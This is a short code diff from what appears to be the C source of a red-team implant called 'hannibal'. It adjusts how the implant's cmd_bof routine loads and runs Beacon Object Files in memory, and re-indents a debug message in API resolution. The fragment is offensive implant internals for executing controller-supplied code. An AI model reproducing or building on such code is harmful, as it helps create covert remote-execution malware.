@@ -144,8 +144,8 @@ PVOID ObjectResolveSymbol(PINSTANCE hannibal_instance_ptr, char *task_uuid, PSTR
 		if (!(Module = hannibal_instance_ptr->Win32.GetModuleHandleA(Library))) {
 			if (!(Module = hannibal_instance_ptr->Win32.LoadLibraryA(Library))) {
 				// printf("[!] Module not found: %s\n", Library);
-					pic_wsprintf(DbgString, L"[!] Module not found: %s\n", Library);
-					hannibal_response(DbgString, task_uuid);
+			pic_wsprintf(DbgString, L"[!] Module not found: %s\n", Library);
+			hannibal_response(DbgString, task_uuid);
 			return NULL;
 			}
 		}
@@ -622,32 +622,12 @@ SECTION_CODE void cmd_bof(TASK t)
 		PAGE_READWRITE
 	);
 	
-	// bof payload size
-	size_t buffer_size = exec_bof->bof_size;
-	
-	// allocate memory for the bof content
-	UINT8 *bof_buff = *(UINT8 **)hannibal_instance_ptr->Win32.VirtualAlloc(
-		NULL,
-		buffer_size,
-		MEM_COMMIT,
-		PAGE_READWRITE
-	);
-
-	if (bof_buff != NULL) {
-		pic_memcpy(bof_buff, exec_bof->bof, buffer_size);
-	}
-
 	bof_in_payload->args = exec_bof->args;
 	bof_in_payload->arg_size = exec_bof->arg_size;
 	bof_in_payload->hannibal_instance = hannibal_instance_ptr;
 	bof_in_payload->controller_uuid = t.task_uuid;
-	bof_in_payload->pbof_content = bof_buff;
-	
-	// protect execute read 
+	bof_in_payload->pbof_content = exec_bof->bof;
 
-	DWORD OldProtection = 0;
-	hannibal_instance_ptr->Win32.VirtualProtect(bof_buff, buffer_size, PAGE_EXECUTE_READ, &OldProtection);
-	
 	// real function
 	do_bof(bof_in_payload);
 
@@ -663,7 +643,6 @@ SECTION_CODE void cmd_bof(TASK t)
     // task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);
 
 	hannibal_instance_ptr->Win32.VirtualFree(bof_in_payload, 0, MEM_RELEASE);
-	hannibal_instance_ptr->Win32.VirtualFree(bof_buff, 0, MEM_RELEASE);
 	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->args, 0, MEM_RELEASE);
 	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->bof, 0, MEM_RELEASE);
 	hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
